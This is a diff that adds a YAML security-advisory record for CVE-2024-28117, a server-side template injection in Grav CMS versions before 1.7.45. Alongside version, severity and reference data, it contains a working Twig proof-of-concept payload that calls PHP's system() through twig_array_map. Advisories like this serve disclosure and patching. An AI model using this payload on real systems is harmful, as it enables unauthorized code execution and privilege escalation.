@@ -1,0 +1,63 @@
+advisory_id: GHSA-qfv4-q44r-g7rv
+datasource_id: github_osv_importer_v2/GHSA-qfv4-q44r-g7rv
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/03/GHSA-qfv4-q44r-g7rv/GHSA-qfv4-q44r-g7rv.json
+aliases:
+  - CVE-2024-28117
+summary: |
+  Server Side Template Injection (SSTI)
+  ### Summary
+  Grav validates accessible functions through the Utils::isDangerousFunction function, but does not impose restrictions on twig functions like twig_array_map, allowing attackers to bypass the validation and execute arbitrary commands.
+
+  ### Details
+  ```
+  {{ grav.twig.twig.getFunction('twig_array_map')|var_dump }}
+  ```
+  ![image](https://user-images.githubusercontent.com/46442697/281397674-6098806a-e936-4849-956e-d394a7c037da.png)
+
+  When we accessed twig_array_map like this, we confirmed that the twigFunction object is properly returned. Since the callable property is correctly included, we can access twig_array_map without any restrictions.
+
+  ```
+  {% set cmd = {'id':'system'} %}
+  {{ twig_array_map(grav.twig.twig,cmd,'call_user_func')|join }}
+  ```
+  Since there is no validation on twig_array_map itself, it is possible to call arbitrary function using call_user_func.
+
+  ### PoC
+  ```
+  {% set cmd = {'id':'system'} %}
+  {{ twig_array_map(grav.twig.twig,cmd,'call_user_func')|join }}
+  ```
+
+  ### Impact
+  Twig processing of static pages can be enabled in the front matter by any administrative user allowed to create or edit pages.
+  As the Twig processor runs unsandboxed, this behavior can be used to gain arbitrary code execution and elevate privileges on the instance.
+impacted_packages:
+  - purl: pkg:composer/getgrav/grav
+    affected_versions: vers:composer/<1.7.45
+    fixed_versions: vers:composer/1.7.45
+severities:
+  - score: '8.8'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
+    published_at: None
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2024/03/GHSA-qfv4-q44r-g7rv/GHSA-qfv4-q44r-g7rv.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at: None
+    url:
+weaknesses:
+  - CWE-94
+references:
+  - url: https://github.com/getgrav/grav
+    reference_type:
+    reference_id:
+  - url: https://github.com/getgrav/grav/commit/de1ccfa12dbcbf526104d68c1a6bc202a98698fe
+    reference_type:
+    reference_id:
+  - url: https://github.com/getgrav/grav/security/advisories/GHSA-qfv4-q44r-g7rv
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2024-28117
+    reference_type:
+    reference_id:
